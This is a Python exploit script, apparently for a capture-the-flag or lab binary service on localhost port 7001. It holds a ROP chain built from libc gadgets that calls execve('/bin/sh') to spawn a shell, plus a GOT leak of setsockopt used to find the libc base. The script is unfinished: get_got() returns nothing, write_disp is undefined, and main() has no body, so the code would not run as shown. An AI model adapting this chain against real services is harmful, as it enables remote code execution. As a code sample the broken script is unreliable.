from struct import pack
import socket
import sys

p = lambda x : pack('Q', x)
host = "localhost"
port = 7001

# obtained with:
# ropper -f /lib/x86_64-linux-gnu/libc.so.6 --chain "execve cmd=/bin/sh"
def rop_chain(libc):

	rebase_0 = lambda x : p(x + libc)

	rop = b'A'*40
	rop += rebase_0(0x000000000002911d) # 0x000000000002911d: pop r13; ret; 
	rop += b'//bin/sh'
	rop += rebase_0(0x00000000000331ff) # 0x00000000000331ff: pop rbx; ret; 
	rop += rebase_0(0x00000000001eb1a0)
	rop += rebase_0(0x0000000000064075) # 0x0000000000064075: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += rebase_0(0x000000000002911d) # 0x000000000002911d: pop r13; ret; 
	rop += p(0x0000000000000000)
	rop += rebase_0(0x00000000000331ff) # 0x00000000000331ff: pop rbx; ret; 
	rop += rebase_0(0x00000000001eb1a8)
	rop += rebase_0(0x0000000000064075) # 0x0000000000064075: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += p(0xdeadbeefdeadbeef)
	rop += rebase_0(0x0000000000026b72) # 0x0000000000026b72: pop rdi; ret; 
	rop += rebase_0(0x00000000001eb1a0)
	rop += rebase_0(0x0000000000027529) # 0x0000000000027529: pop rsi; ret; 
	rop += rebase_0(0x00000000001eb1a8)
	rop += rebase_0(0x000000000011c371) # 0x000000000011c371: pop rdx; pop r12; ret; 
	rop += rebase_0(0x00000000001eb1a8)
	rop += p(0xdeadbeefdeadbeef)
	rop += rebase_0(0x000000000004a550) # 0x000000000004a550: pop rax; ret; 
	rop += p(0x000000000000003b)
	rop += rebase_0(0x0000000000066229) # 0x0000000000066229: syscall; ret; 

	return rop

def get_got():
	read_got_off = 0x2014c0

	pop_rdi 	= 0x00fab
	pop_rsi_r15 = 0x00fa9
	call_qword_ptr_rbp_plus_0x48 = 0x00bef

	payload_body = b''


	pad = b"1\x00" + b"A"*48

def get_libc():
	got = get_got()
	setsockopt_addr = int.from_bytes(got[write_disp: write_disp + 8], 'little')
	print("setsockopt address: %x" % setsockopt_addr )
	print("libc: %x" % (setsockopt_addr - 0x1111d0))
	return setsockopt_addr - 0x1111d0

def main():
	

if __name__ == '__main__':
	main()



